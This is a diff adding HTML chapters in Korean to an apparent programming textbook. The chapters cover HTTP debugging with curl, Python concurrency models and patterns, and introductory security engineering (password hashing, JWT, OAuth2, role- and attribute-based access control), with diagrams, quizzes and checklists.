+  <rect x="457" y="45" width="90" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="502" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">5. Server</text>
+  <text x="502" y="83" class="sub-text" text-anchor="middle" font-size="9">Process request</text>
+
+  <rect x="570" y="45" width="110" height="52" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="625" y="66" class="label-text" text-anchor="middle" font-size="11" font-weight="600">6. Response</text>
+  <text x="625" y="83" class="sub-text" text-anchor="middle" font-size="9">200 OK + JSON</text>
+
+  <line x1="95" y1="71" x2="118" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="208" y1="71" x2="231" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="321" y1="71" x2="344" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="434" y1="71" x2="457" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="547" y1="71" x2="570" y2="71" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <text x="50" y="33" class="sub-text" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="600">Browser</text>
+  <text x="502" y="33" class="sub-text" text-anchor="middle" font-size="11" fill="var(--accent)" font-weight="600">Server</text>
+
+  <path d="M625,97 L625,135 L50,135 L50,125" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead)"/>
+  <text x="350" y="153" class="sub-text" text-anchor="middle" font-size="10">Response travels back through the same layers</text>
+
+  <text x="350" y="183" class="sub-text" text-anchor="middle" font-size="11">First request: 50&ndash;300ms (DNS + TCP + TLS)</text>
+  <text x="350" y="201" class="sub-text" text-anchor="middle" font-size="11">Subsequent: 10&ndash;100ms (TCP/TLS reused via keep-alive)</text>
+</svg>
+
+<h3>디버깅 도구</h3>
+
+<pre style="overflow-x:auto"><code># curl &mdash; the Swiss Army knife of HTTP debugging
+$ curl https://api.taskforge.dev/tasks          # GET request
+$ curl -v https://api.taskforge.dev/tasks       # Verbose: headers, TLS info
+$ curl -I https://api.taskforge.dev/tasks       # HEAD: headers only
+$ curl -X POST -H "Content-Type: application/json" \
+       -d '{"title":"New task"}' \
+       https://api.taskforge.dev/tasks          # POST with JSON
+
+# dig &mdash; DNS debugging
+$ dig api.taskforge.dev                          # Full DNS record
+$ dig +short api.taskforge.dev                   # Just the IP
+
+# traceroute &mdash; see the network path
+$ traceroute api.taskforge.dev                   # Shows each hop</code></pre>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge 연결</div>
+<p>TaskForge API 호출을 모든 네트워크 레이어를 통해 추적하십시오. <code>curl -v http://localhost:5000/tasks</code>를 실행하고 각 단계를 식별하십시오: TCP 핸드셰이크, 전송된 HTTP 요청 헤더, 응답 상태, 응답 본문. <code>-v</code> 플래그가 모든 것을 드러냅니다.</p>
+</div>
+
+<div class="pq">"네트워크가 곧 컴퓨터다." &mdash; John Gage, Sun Microsystems</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">직접 해보기 &mdash; curl 상세 출력 읽기</div>
+<p>터미널에서 <code>curl -v https://httpbin.org/get</code>을 실행하십시오. 다음을 식별하십시오: (1) DNS 확인, (2) TCP 연결, (3) TLS 핸드셰이크 세부 사항, (4) 요청 헤더, (5) 응답 상태 코드, (6) 응답 헤더. 각 섹션이 무엇을 알려주는지 적어 보십시오.</p>
+</div>
+
+<!-- Ch31 Quiz: TCP -->
+<div class="quiz" data-ch="31" data-ex="tcp-handshake">
+  <h4>핵심 개념 확인</h4>
+  <p>TCP 3방향 핸드셰이크에서는 무슨 일이 일어납니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">클라이언트가 데이터를 보내고, 서버가 확인하고, 클라이언트가 더 많은 데이터를 보냅니다</button>
+    <button class="quiz-option" data-correct="true">클라이언트가 SYN을 보내고, 서버가 SYN-ACK로 응답하고, 클라이언트가 ACK를 보냅니다</button>
+    <button class="quiz-option" data-correct="false">클라이언트와 서버가 세 번 암호화 키를 교환합니다</button>
+    <button class="quiz-option" data-correct="false">클라이언트가 요청을 보내고, 서버가 응답을 보내고, 클라이언트가 수신을 확인합니다</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch31 Quiz: Status codes -->
+<div class="quiz" data-ch="31" data-ex="http-status-codes">
+  <h4>핵심 개념 확인</h4>
+  <p>서버가 요청을 이해했지만 권한을 부여하기를 거부한다는 HTTP 상태 코드는 무엇입니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">401 Unauthorized</button>
+    <button class="quiz-option" data-correct="true">403 Forbidden</button>
+    <button class="quiz-option" data-correct="false">404 Not Found</button>
+    <button class="quiz-option" data-correct="false">400 Bad Request</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch31 Checklist -->
+<div class="checklist" data-ch="31" data-ex="networking-understanding">
+  <h4>네트워킹 마스터 체크리스트</h4>
+  <label><input type="checkbox"><span>TCP와 UDP의 차이점과 각각 언제 사용하는지 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>DNS가 도메인 이름을 IP 주소로 변환하는 방법을 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span><code>curl -v</code>를 사용하여 API 호출을 디버깅하고 출력을 읽을 수 있습니다</span></label>
+  <label><input type="checkbox"><span>401과 403 상태 코드의 차이를 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>TLS가 무엇을 하고 HTTPS가 왜 중요한지 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>웹소켓 대 폴링 대 서버 전송 이벤트를 언제 사용해야 할지 압니다</span></label>
+  <label><input type="checkbox"><span>HTTP 요청을 모든 네트워크 레이어를 통해 추적할 수 있습니다</span></label>
+</div>
+
+</section>
+
+
+<!-- ===== CH 32 ===== -->
+<section id="ch32" data-ch="32">
+<h2><span class="ch-label">Chapter 32</span> 동시성과 병렬 처리</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">지금 이것이 중요한 이유</div>
+<p>현대 애플리케이션은 동시에 많은 일을 합니다: 여러 웹 요청 처리, 여러 API에서 데이터를 동시에 가져오기, UI 응답성을 유지하면서 파일 처리. 동시성(concurrency)을 이해하면 멈추지 않고, 데이터를 잃지 않으며, 현대 하드웨어를 최대한 활용하는 애플리케이션을 구축할 수 있습니다.</p>
+</div>
+
+<h3>세 가지 모델: 프로세스, 스레드, Async</h3>
+
+<p>Python은 동시에 여러 가지를 수행하는 세 가지 근본적인 방법을 제공합니다. 각각 다른 상황에 적합합니다.</p>
+
+<p><strong>프로세스(Process)</strong>는 별도의 메모리 공간에서 실행되는 완전히 독립적인 프로그램입니다. 여러 CPU 코어에서 진정으로 병렬로 실행될 수 있습니다. 하지만 생성 비용이 높고 프로세스 간 통신이 복잡합니다.</p>
+
+<p><strong>스레드(Thread)</strong>는 단일 프로세스 내의 가벼운 실행 단위입니다. 메모리를 공유하여 통신은 쉽지만 위험합니다(경쟁 조건). Python에서는 GIL이 CPU 바운드 작업에서의 효과를 제한합니다.</p>
+
+<p><strong>Async/await</strong>(협력적 멀티태스킹)는 단일 스레드를 사용하지만 I/O를 기다리는 작업이 있을 때마다 작업 간에 전환합니다. I/O 바운드 작업에 매우 효율적이지만 CPU 바운드 작업을 빠르게 할 수는 없습니다.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>워크로드 유형별 동시성 모델 선택</caption>
+<thead><tr><th>워크로드</th><th>최적 모델</th><th>이유</th></tr></thead>
+<tbody>
+<tr><td>1000개의 동시 API 요청</td><td><strong>Async/await</strong></td><td>I/O 바운드; async가 대기를 효율적으로 처리</td></tr>
+<tr><td>이미지 1000개 처리</td><td><strong>멀티프로세싱</strong></td><td>CPU 바운드; 진정한 병렬성 필요</td></tr>
+<tr><td>공유 인메모리 캐시</td><td><strong>스레딩</strong>(잠금 포함)</td><td>공유 메모리가 편리</td></tr>
+<tr><td>백그라운드 정리 작업</td><td><strong>스레드 또는 프로세스</strong></td><td>독립적으로 실행</td></tr>
+</tbody>
+</table>
+</div>
+
+<!-- Concurrency SVG Diagram -->
+<svg viewBox="0 0 700 300" aria-label="Diagram comparing sequential execution where all tasks run one after another, concurrent execution where tasks are interleaved on one core, and parallel execution where tasks run simultaneously on separate cores" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <text x="100" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Sequential</text>
+  <text x="360" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Concurrent</text>
+  <text x="590" y="25" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Parallel</text>
+
+  <!-- Sequential -->
+  <text x="15" y="62" class="sub-text" font-size="10">Core 1</text>
+  <rect x="50" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.8"/>
+  <text x="90" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task A</text>
+  <rect x="130" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.55"/>
+  <text x="170" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task B</text>
+  <rect x="210" y="45" width="80" height="25" rx="4" fill="var(--accent)" opacity="0.35"/>
+  <text x="250" y="62" text-anchor="middle" font-size="10" fill="var(--bg)">Task C</text>
+  <text x="100" y="93" class="sub-text" text-anchor="middle" font-size="10">Total: 3 time units</text>
+
+  <!-- Concurrent -->
+  <text x="265" y="140" class="sub-text" font-size="10">Core 1</text>
+  <rect x="300" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="314" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">A</text>
+  <rect x="328" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="342" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">B</text>
+  <rect x="356" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="370" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">C</text>
+  <rect x="384" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="398" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">A</text>
+  <rect x="412" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="426" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">B</text>
+  <rect x="440" y="125" width="28" height="24" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="454" y="141" text-anchor="middle" font-size="8" fill="var(--bg)">C</text>
+  <text x="360" y="172" class="sub-text" text-anchor="middle" font-size="10">Still ~3 units, but all tasks make progress</text>
+
+  <!-- Parallel -->
+  <text x="510" y="215" class="sub-text" font-size="10">Core 1</text>
+  <rect x="550" y="200" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.8"/>
+  <text x="610" y="215" text-anchor="middle" font-size="10" fill="var(--bg)">Task A</text>
+
+  <text x="510" y="242" class="sub-text" font-size="10">Core 2</text>
+  <rect x="550" y="227" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.55"/>
+  <text x="610" y="242" text-anchor="middle" font-size="10" fill="var(--bg)">Task B</text>
+
+  <text x="510" y="269" class="sub-text" font-size="10">Core 3</text>
+  <rect x="550" y="254" width="120" height="22" rx="3" fill="var(--accent)" opacity="0.35"/>
+  <text x="610" y="269" text-anchor="middle" font-size="10" fill="var(--bg)">Task C</text>
+
+  <text x="590" y="295" class="sub-text" text-anchor="middle" font-size="10">Total: ~1 time unit (3x speedup)</text>
+
+  <line x1="230" y1="10" x2="230" y2="290" stroke="var(--a5)" stroke-width="1" stroke-dasharray="4,4"/>
+  <line x1="480" y1="10" x2="480" y2="290" stroke="var(--a5)" stroke-width="1" stroke-dasharray="4,4"/>
+</svg>
+
+<h3>Python의 GIL</h3>
+
+<p><strong>전역 인터프리터 잠금(Global Interpreter Lock, GIL)</strong>은 CPython에서 한 번에 하나의 스레드만 Python 바이트코드를 실행하도록 보장하는 뮤텍스(mutex)입니다. 이는 스레드가 CPU 바운드 작업에서 진정한 병렬성을 달성할 수 없음을 의미합니다.</p>
+
+<p><strong>GIL이 방지하는 것:</strong> 두 스레드가 서로 다른 코어에서 동시에 숫자를 계산하는 것.</p>
+
+<p><strong>GIL이 방지하지 않는 것:</strong> I/O 바운드 동시성. 스레드가 네트워크 응답이나 디스크 읽기를 기다릴 때 GIL을 해제하여 다른 스레드가 실행될 수 있습니다. 이것이 스레딩이 I/O 작업에 여전히 잘 작동하는 이유입니다.</p>
+
+<pre style="overflow-x:auto"><code>import threading
+import time
+
+# I/O-bound: threading helps (GIL released during sleep/network)
+def fetch_data(url):
+    time.sleep(1)  # Simulates network I/O
+    return f"Data from {url}"
+
+# CPU-bound: threading does NOT help (GIL blocks parallelism)
+def compute_heavy(n):
+    total = 0
+    for i in range(n):
+        total += i * i
+    return total</code></pre>
+
+<h3>스레딩 (Threading)</h3>
+
+<p>Python의 <code>threading</code> 모듈을 사용하면 함수를 동시에 실행할 수 있습니다. 그러나 스레드 간 공유 상태는 동기화 없이는 위험합니다.</p>
+
+<pre style="overflow-x:auto"><code>import threading
+
+counter = 0  # Shared state &mdash; danger!
+
+def increment():
+    global counter
+    for _ in range(100000):
+        counter += 1  # NOT thread-safe!
+
+t1 = threading.Thread(target=increment)
+t2 = threading.Thread(target=increment)
+t1.start(); t2.start()
+t1.join(); t2.join()
+
+print(counter)  # Expected: 200000. Actual: something less!</code></pre>
+
+<p>해결책은 <strong>잠금(lock)</strong>입니다.</p>
+
+<pre style="overflow-x:auto"><code>lock = threading.Lock()
+counter = 0
+
+def safe_increment():
+    global counter
+    for _ in range(100000):
+        with lock:  # Only one thread at a time
+            counter += 1</code></pre>
+
+<h3>Async/Await</h3>
+
+<p><strong>Async/await</strong>는 Python의 협력적 멀티태스킹 시스템입니다. <strong>코루틴(coroutine)</strong>(<code>async def</code>로 정의)은 I/O를 기다리는 동안 <code>await</code>로 일시 중지하여 같은 스레드에서 다른 코루틴이 실행되게 합니다.</p>
+
+<pre style="overflow-x:auto"><code>import asyncio
+
+async def fetch_task(task_id):
+    print(f"Fetching task {task_id}...")
+    await asyncio.sleep(1)  # Non-blocking wait
+    print(f"Got task {task_id}")
+    return {"id": task_id, "title": f"Task {task_id}"}
+
+async def main():
+    # All three start concurrently, wait together
+    results = await asyncio.gather(
+        fetch_task(1),
+        fetch_task(2),
+        fetch_task(3),
+    )
+    # ~1 second total, not 3!
+    print(f"Got {len(results)} tasks")
+
+# asyncio.run(main())  # Starts the event loop</code></pre>
+
+<p><strong>이벤트 루프(event loop)</strong>가 실행 중인 모든 코루틴을 관리합니다. 하나가 <code>await</code>에 도달하면 루프에 제어권을 넘겨주고, 루프는 준비된 다른 코루틴을 실행합니다.</p>
+
+<h3>멀티프로세싱 (Multiprocessing)</h3>
+
+<p>CPU 바운드 작업에는 <code>multiprocessing</code>이 별도의 Python 프로세스를 생성하며, 각각 자체 GIL을 가집니다. 여러 코어에서 진정한 병렬성을 달성합니다.</p>
+
+<pre style="overflow-x:auto"><code>from multiprocessing import Pool
+
+def process_image(path):
+    """CPU-heavy image processing."""
+    # ... computation ...
+    return f"Processed {path}"
+
+# Process 8 images across 4 CPU cores
+with Pool(processes=4) as pool:
+    results = pool.map(process_image, [
+        "img1.png", "img2.png", "img3.png", "img4.png",
+        "img5.png", "img6.png", "img7.png", "img8.png",
+    ])
+# ~2x faster than sequential on 4 cores</code></pre>
+
+<h3>흔한 동시성 버그</h3>
+
+<p><strong>경쟁 조건 (Race condition):</strong> 두 스레드가 같은 데이터를 읽고-수정하고-쓰는데 인터리빙이 잘못된 결과를 냅니다. 해결: 잠금이나 원자적 연산 사용.</p>
+
+<p><strong>교착 상태 (Deadlock):</strong> 스레드 A가 잠금 1을 보유하고 잠금 2를 기다립니다. 스레드 B가 잠금 2를 보유하고 잠금 1을 기다립니다. 해결: 항상 같은 전역 순서로 잠금 획득.</p>
+
+<p><strong>기아 상태 (Starvation):</strong> 다른 스레드들이 계속 먼저 차지해서 스레드가 리소스에 접근하지 못합니다. 해결: 공정한 잠금이나 우선순위 큐 사용.</p>
+
+<p><strong>스탬피드 (Thundering herd):</strong> 많은 스레드가 동시에 깨어나 하나의 리소스를 경쟁합니다(예: 캐시가 만료되어 1000개의 요청이 모두 재생성). 해결: 단일 플라이트(single-flight) 패턴 — 하나의 스레드가 재생성하고 나머지는 결과를 기다립니다.</p>
+
+<h3>패턴</h3>
+
+<h4>생산자/소비자 (Producer/Consumer)</h4>
+
+<p>생산자는 작업 항목을 큐에 추가하고, 소비자는 처리합니다. 큐가 생산과 소비를 분리합니다.</p>
+
+<pre style="overflow-x:auto"><code>import queue
+import threading
+
+work_queue = queue.Queue()
+
+def producer():
+    for i in range(10):
+        work_queue.put(f"task-{i}")
+    work_queue.put(None)  # Sentinel: signals completion
+
+def consumer():
+    while True:
+        item = work_queue.get()
+        if item is None:
+            break
+        print(f"Processing {item}")
+        work_queue.task_done()</code></pre>
+
+<h4>스레드 풀 (Thread Pool)</h4>
+
+<p>작업마다 스레드를 생성하는 대신 고정된 풀을 재사용합니다. Python의 <code>concurrent.futures.ThreadPoolExecutor</code>가 이를 제공합니다.</p>
+
+<pre style="overflow-x:auto"><code>from concurrent.futures import ThreadPoolExecutor, as_completed
+
+def fetch_url(url):
+    import time
+    time.sleep(0.5)
+    return f"Content from {url}"
+
+with ThreadPoolExecutor(max_workers=5) as executor:
+    futures = {executor.submit(fetch_url, u): u
+               for u in ["url1", "url2", "url3", "url4", "url5"]}
+
+    for future in as_completed(futures):
+        url = futures[future]
+        print(f"{url}: {future.result()}")</code></pre>
+
+<h4>팬아웃/팬인 (Fan-Out / Fan-In)</h4>
+
+<p><strong>팬아웃(Fan-out):</strong> 작업을 많은 병렬 서브태스크로 분할합니다. <strong>팬인(Fan-in):</strong> 결과를 수집하고 합칩니다. 이것이 맵-리듀스(map-reduce), 병렬 웹 스크래핑, 배치 처리 뒤의 패턴입니다.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge 연결</div>
+<p>TaskForge의 API 서버가 동시성을 어떻게 사용할 수 있는지 설계하십시오. Flask의 개발 서버는 한 번에 하나의 요청을 처리합니다. 프로덕션에서는 Gunicorn이 여러 워커 프로세스를 생성합니다(멀티프로세싱). "모든 태스크를 PDF로 내보내기"에는 백그라운드 스레드 풀을 사용할 수 있습니다. 각 시나리오에 어떤 동시성 모델이 맞는지 스케치하십시오.</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">직접 해보기 &mdash; 동시성 모델 매칭</div>
+<p>각 시나리오에 대해 최적의 모델을 선택하십시오:</p>
+<ul>
+<li>인터넷에서 파일 50개를 동시에 다운로드 &rarr; <strong>async 또는 스레딩</strong></li>
+<li>고해상도 사진 200장 크기 조정 &rarr; <strong>멀티프로세싱</strong></li>
+<li>연결 10,000개의 채팅 서버 &rarr; <strong>async</strong></li>
+<li>페이지를 가져오고 HTML을 파싱하는 스크래퍼 &rarr; <strong>가져오기에는 async + 무거운 파싱에는 멀티프로세싱</strong></li>
+</ul>
+</div>
+
+<!-- Ch32 Quiz: GIL -->
+<div class="quiz" data-ch="32" data-ex="gil-bypass">
+  <h4>핵심 개념 확인</h4>
+  <p>CPU 바운드 작업에서 진정한 병렬성을 달성하기 위해 GIL을 우회하는 Python 동시성 모델은 무엇입니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">threading</button>
+    <button class="quiz-option" data-correct="false">asyncio</button>
+    <button class="quiz-option" data-correct="true">multiprocessing</button>
+    <button class="quiz-option" data-correct="false">concurrent.futures.ThreadPoolExecutor</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch32 Quiz: Deadlock -->
+<div class="quiz" data-ch="32" data-ex="deadlock-cause">
+  <h4>핵심 개념 확인</h4>
+  <p>교착 상태의 원인은 무엇입니까?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="false">스레드가 CPU를 100% 소비하는 무한 루프를 실행합니다</button>
+    <button class="quiz-option" data-correct="true">두 스레드가 각각 상대방이 필요로 하는 잠금을 보유하여 둘 다 영원히 기다립니다</button>
+    <button class="quiz-option" data-correct="false">스레드가 잠금을 획득한 후 해제하는 것을 잊습니다</button>
+    <button class="quiz-option" data-correct="false">너무 많은 스레드가 동시에 같은 리소스를 경쟁합니다</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch32 Checklist -->
+<div class="checklist" data-ch="32" data-ex="concurrency-understanding">
+  <h4>동시성 이해 체크리스트</h4>
+  <label><input type="checkbox"><span>동시성과 병렬성의 차이를 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>GIL이 무엇이고 Python 스레딩에 어떤 영향을 미치는지 압니다</span></label>
+  <label><input type="checkbox"><span>주어진 워크로드에 대해 스레딩, async, 멀티프로세싱 중에서 선택할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>경쟁 조건이 무엇이고 잠금이 어떻게 방지하는지 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>생산자/소비자 패턴을 설명할 수 있습니다</span></label>
+  <label><input type="checkbox"><span>교착 상태가 왜 발생하고 어떻게 방지하는지 이해합니다</span></label>
+  <label><input type="checkbox"><span>async/await가 스레딩보다 더 나은 경우를 압니다</span></label>
+</div>
+
+</section>
+
+
+<!-- ===== CH 33 ===== -->
+<section id="ch33" data-ch="33">
+<h2><span class="ch-label">Chapter 33</span> 보안 엔지니어링</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">지금 이것이 중요한 이유</div>
+<p>모든 웹 애플리케이션은 공격 대상입니다. SQL 인젝션, 탈취된 비밀번호, 유출된 API 키&mdash;이런 일은 매일 발생합니다. 보안은 마지막에 덧붙이는 것이 아니라, 모든 코드에 녹아 있어야 하는 사고방식입니다. 이 챕터는 공격자처럼 생각하고 엔지니어처럼 방어하는 법을 가르칩니다.</p>
+</div>
+
+<h3>인증 (Authentication) &mdash; 당신은 누구입니까?</h3>
+
+<p><strong>인증(authentication)</strong>은 누군가의 신원을 확인합니다. 가장 흔한 형태는 사용자 이름 + 비밀번호입니다.</p>
+
+<h4>비밀번호 해싱 (Password Hashing)</h4>
+
+<p>첫 번째 규칙: <strong>비밀번호를 평문으로 저장하지 마십시오.</strong> 데이터베이스가 침해되면 모든 사용자의 비밀번호가 노출됩니다. 대신 <strong>해시(hash)</strong> — 단방향 수학적 지문 — 를 저장하십시오.</p>
+
+<pre style="overflow-x:auto"><code>import hashlib
+import os
+
+def hash_password(password, salt=None):
+    """Hash a password with a random salt."""
+    if salt is None:
+        salt = os.urandom(16)
+    hashed = hashlib.pbkdf2_hmac(
+        'sha256',
+        password.encode('utf-8'),
+        salt,
+        iterations=100000  # Slow on purpose!
+    )
+    return salt, hashed
+
+def verify_password(password, salt, stored_hash):
+    """Verify a password against a stored hash."""
+    _, new_hash = hash_password(password, salt)
+    return new_hash == stored_hash
+
+# Registration
+salt, hashed = hash_password("my_secret_password")
+# Store salt + hashed in database (NOT the plaintext password!)
+
+# Login
+is_valid = verify_password("my_secret_password", salt, hashed)  # True</code></pre>
+
+<p>핵심 개념:</p>
+<ul>
+<li><strong>솔트(Salt):</strong> 해싱 전 각 비밀번호에 추가하는 임의값. 두 사용자가 같은 비밀번호를 가져도 해시는 다릅니다. 레인보우 테이블(미리 계산된 해시 조회)도 무력화합니다.</li>
+<li><strong>느린 해싱:</strong> bcrypt, scrypt, PBKDF2 같은 알고리즘은 의도적으로 느립니다. 이는 무차별 대입 공격을 비실용적으로 만듭니다: 추측 하나를 해싱하는 데 밀리초가 걸리지만 수십억 번의 추측에는 수년이 걸립니다.</li>
+<li><strong>해싱은 암호화가 아닙니다:</strong> 암호화는 역방향이 가능합니다(키로 복호화). 해싱은 단방향입니다(원본을 복구할 수 없습니다).</li>
+</ul>
+
+<h4>JWT 토큰 (JSON Web Token)</h4>
+
+<p><strong>JSON 웹 토큰(JSON Web Tokens, JWT)</strong>은 인증 정보를 전달하는 압축된 방법입니다. JWT는 세 개의 base64 인코딩 부분으로 구성됩니다: <code>헤더.페이로드.서명</code>.</p>
+
+<pre style="overflow-x:auto"><code># Conceptual JWT structure
+# Header:    {"alg": "HS256", "typ": "JWT"}
+# Payload:   {"user_id": 42, "role": "admin", "exp": 1711324800}
+# Signature: HMAC-SHA256(header + "." + payload, secret_key)
+
+# Server creates JWT after login:
+# token = jwt.encode({"user_id": 42, "exp": ...}, SECRET, algorithm="HS256")
+
+# Client sends in Authorization header:
+# Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+# Server verifies on each request:
+# data = jwt.decode(token, SECRET, algorithms=["HS256"])</code></pre>
+
+<h4>OAuth2 흐름</h4>
+
+<p><strong>OAuth2</strong>는 사용자가 비밀번호를 공유하지 않고 기존 계정(Google, GitHub)을 사용하여 앱에 로그인할 수 있게 합니다.</p>
+
+<!-- OAuth2 SVG Diagram -->
+<svg viewBox="0 0 720 330" aria-label="OAuth2 authorisation code flow showing user visiting app, redirect to auth server, user login, callback with code, code exchange for token, then token used for API access" style="width:100%;max-width:720px;margin:1.5rem auto;display:block">
+  <rect x="10" y="15" width="120" height="42" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="70" y="41" class="label-text" text-anchor="middle" font-size="13" font-weight="600">User</text>
+
+  <rect x="290" y="15" width="140" height="42" rx="8" class="node-accent" stroke="var(--accent)" stroke-width="2"/>
+  <text x="360" y="41" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Your App</text>
+
+  <rect x="580" y="15" width="130" height="42" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="645" y="36" class="label-text" text-anchor="middle" font-size="12" font-weight="600">Auth Server</text>
+  <text x="645" y="51" class="sub-text" text-anchor="middle" font-size="9">(Google, GitHub)</text>
+
+  <line x1="130" y1="80" x2="290" y2="80" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="210" y="74" class="sub-text" text-anchor="middle" font-size="10">1. Click &ldquo;Login with Google&rdquo;</text>
+
+  <line x1="430" y1="100" x2="580" y2="100" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="94" class="sub-text" text-anchor="middle" font-size="10">2. Redirect to login page</text>
+
+  <line x1="580" y1="130" x2="130" y2="130" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <text x="355" y="124" class="sub-text" text-anchor="middle" font-size="10">3. User enters credentials at auth server</text>
+
+  <line x1="580" y1="165" x2="430" y2="165" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="159" class="sub-text" text-anchor="middle" font-size="10">4. Callback with auth code</text>
+
+  <line x1="430" y1="198" x2="580" y2="198" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="192" class="sub-text" text-anchor="middle" font-size="10">5. Exchange code for token</text>
+
+  <line x1="580" y1="228" x2="430" y2="228" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="222" class="sub-text" text-anchor="middle" font-size="10">6. Access token returned</text>
+
+  <line x1="430" y1="260" x2="580" y2="260" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="505" y="254" class="sub-text" text-anchor="middle" font-size="10">7. Use token to get user data</text>
+
+  <line x1="290" y1="290" x2="130" y2="290" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <text x="210" y="284" class="sub-text" text-anchor="middle" font-size="10">8. User is logged in!</text>
+
+  <text x="360" y="322" class="sub-text" text-anchor="middle" font-size="10">Your app never sees the user&rsquo;s Google/GitHub password</text>
+</svg>
+
+<h3>권한 부여 (Authorisation) &mdash; 무엇을 할 수 있습니까?</h3>
+
+<p>인증(authentication) = "당신은 누구입니까?" <strong>권한 부여(authorisation)</strong> = "당신은 무엇을 할 수 있습니까?"</p>
+
+<h4>역할 기반 접근 제어 (Role-Based Access Control, RBAC)</h4>
+
+<p>사용자에게 <strong>역할(role)</strong>(admin, editor, viewer)이 할당됩니다. 각 역할은 특정 권한을 갖습니다.</p>
+
+<pre style="overflow-x:auto"><code>PERMISSIONS = {
+    "admin":  ["create", "read", "update", "delete", "manage_users"],
+    "editor": ["create", "read", "update"],
+    "viewer": ["read"],
+}
+
+def check_permission(user_role, action):
+    allowed = PERMISSIONS.get(user_role, [])
+    if action not in allowed:
+        raise PermissionError(f"Role '{user_role}' cannot '{action}'")</code></pre>
+
+<h4>속성 기반 접근 제어 (Attribute-Based Access Control, ABAC)</h4>
+
+<p><strong>ABAC</strong>는 여러 속성을 기반으로 결정을 내립니다: 사용자의 부서, 리소스의 분류, 시간대.</p>
+
+<pre style="overflow-x:auto"><code>def can_access_task(user, task):
+    """ABAC: access depends on multiple attributes."""
+    if user.role == "admin":
+        return True
+    if task.project_id in user.project_ids:
+        return True
+    if task.is_public:
+        return True
+    return False</code></pre>
+
+<p><strong>최소 권한의 원칙(Principle of Least Privilege):</strong> 모든 사용자, 프로세스, 컴포넌트에 필요한 최소한의 권한만 부여합니다. 태스크를 읽기만 하는 API에는 쓰기 접근 권한이 없어야 합니다.</p>
+
